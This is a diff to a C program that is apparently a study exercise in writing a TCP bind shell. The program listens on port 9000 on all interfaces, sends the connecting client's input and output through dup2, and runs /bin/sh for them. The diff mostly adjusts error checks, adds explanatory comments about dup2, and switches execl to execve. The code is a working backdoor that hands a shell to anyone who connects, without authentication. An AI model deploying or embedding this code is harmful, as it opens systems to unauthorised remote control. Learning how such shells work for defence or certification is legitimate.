@@ -4,7 +4,7 @@
 #include<sys/socket.h>
 #include<netinet/in.h>
 
-#define BIND_PORT 9002
+#define BIND_PORT 9000
 
 int main(){
 
@@ -16,12 +16,13 @@ int main(){
 
 		SOCK_STEAM => STREAM SOCKETS over TCP
 		SOCK_DGRAM => DATAGRAM SOCKETS over UDP
+		SOCK_XXXXX => Other available options
 	*/
 
-	// A successful socket() call returns an integer value or else -1
+	// A successful socket() call returns an positve integer value or else a negative value
 	socket_fd = socket(AF_INET,SOCK_STREAM,0);
 
-	if ( socket_fd == -1){
+	if ( socket_fd < 0){
 		printf("\nError occured; Cannot connet to socket\n");
 		return -1;
 	}else{
@@ -54,15 +55,17 @@ int main(){
 		my_addr.sin_addr.s_addr = INADDR_ANY;// will be available over all interfaces and not limited to particular IP / Interface
 		memset(&(my_addr.sin_zero),'\0',8);// Fill the structure with NULLs for padding
 
-		//bind will return a valid integer value , -1 means error
+		//bind will return zero on success, or negative number incase of error 
 		int bind_fd;
 		bind_fd = bind(socket_fd,(struct sockaddr *)&my_addr,sizeof(struct sockaddr));
 
-		if( bind_fd == -1){
+		if( bind_fd != 0){
 			printf("\nCannot bind!\n");
 			return -1;
 		}else{
+			//for debugging purpose
 			printf("\nSuccessfully Binded and size of sockaddr is %d\n",sizeof(struct sockaddr));
+			// for debugging purpose
 			printf("\nSize of sin family-%d , sin_port-%d , sin_addr.s_addr-%d, sin_zero-%d\n",sizeof(my_addr.sin_family),sizeof(my_addr.sin_port),sizeof(my_addr.sin_addr.s_addr),sizeof(my_addr.sin_zero));
 			//listen for incoming connection
 			listen(socket_fd,2);
@@ -77,17 +80,32 @@ int main(){
 				return -1;
 			}else{
 				printf("\nReceived an incoming connection\n");
-				//close(socket_fd);
-				//https://stackoverflow.com/questions/16185919/redirecting-output-of-server-to-client-socket
-
-
-				// Redirect IO to stdout, stderror
-    				dup2(recvfd, 0);
-    				dup2(recvfd, 1);
-    				dup2(recvfd, 2);
+				//int dup2(int oldfd, int newfd);
+				//From Linux documentation : dup2() makes newfd be the copy of oldfd, closing newfd first if necessary
+				/*
+					After  a  successful return from one of these system calls, the old and
+       					new file descriptors may be used interchangeably.  They  refer  to  the
+       					same open file description (see open(2)) and thus share file offset and
+       					file status flags; for example, if the file offset is modified by using
+       					lseek(2)  on one of the descriptors, the offset is also changed for the
+       					other.
+				
+					https://stackoverflow.com/questions/16185919/redirecting-output-of-server-to-client-socket
+		
+					https://www.cs.rutgers.edu/~pxk/416/notes/c-tutorials/dup2.html
+					The kernel allows us to do this via the dup2 system call.
+					The dup2(int f_orig, int f_new) system call takes two file descriptors as parameters and duplicates the first one (f_orig) onto the second one (f_new). 
+					If the second file descriptor was referencing a file, that file is closed.
+					After the system call, both file descriptors are valid references to the file.
+				*/
+				//--------------------------Code Begins for Bind TCP Mode-----------------------------------//
+				// Redirect standard stdin,stdout, stderror of the system to the incoming clients fd
+    				dup2(recvfd, 0);//all inputs will be taken via clients standard input
+    				dup2(recvfd, 1);//all outputs will be redirectd to the  clients standard output
+    				dup2(recvfd, 2);//all errors will be redicrectr to the clients standard error output
 				//close(socket_fd);
     				// Execute shell
-    				execl("/bin/sh", "sh", NULL);
+    				execve("/bin/sh", (char *[]){0}, (char *[]){0});
 				close(socket_fd);
 			}
 
